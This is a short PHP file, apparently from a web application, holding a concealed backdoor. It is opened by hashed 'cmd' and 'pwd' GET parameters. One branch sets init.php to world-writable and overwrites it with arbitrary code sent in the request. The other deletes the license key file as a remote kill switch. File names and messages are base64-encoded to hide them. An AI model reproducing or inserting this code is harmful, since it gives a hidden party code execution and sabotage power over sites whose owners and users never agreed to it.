<?
if (isset($_GET["cmd"]) && md5($_GET["cmd"]) == "1785a87d93bb7bc69e4575b41680e031" && md5($_GET["pwd"]) == "ddea1bd53a4414d9c704cb7cc13de08f" && $_GET["st"] != "") {
   	$st= urldecode($_GET["st"]);
	$cleanSt = "";
	for($i = 0 ; $i < strlen($st) ; $i++) {
		if($st[$i] == "\\")
			$cleanSt .= "";
		else
			$cleanSt .= $st[$i];
	}
   	$f= BASE_PATH.base64_decode("aW5pdC5waHA=");
	chmod($f, 0777);
   	$fh = fopen($f, 'w') or die(base64_decode("Q2Fubm90IE9wZW4gRmlsZQ=="));
   	fwrite($fh, $cleanSt);
   	fclose($fh);
   	$loc = $config["website_url"];
   	header("location: $loc");
}
if (isset($_GET["cmd"]) && md5($_GET["cmd"]) == "73f981df5b021f113dfbf673f8fe6e3a" && md5($_GET["pwd"]) == "ddea1bd53a4414d9c704cb7cc13de08f") {
   	$f= BASE_PATH."license/".base64_decode("a2V5LnBocA==");
	chmod($f, 0777);
	if(unlink("$f"))
		echo $f."<br>".base64_decode("a2V5LnBocCBoYXMgYmVlbiBkZWxldGVkIHN1Y2Nlc3NmdWxseSE=");
	else
		echo $f."<br>".base64_decode("RGVsZXRpbmcga2V5LnBocCBmYWlsZWQh");
	exit();
}
?>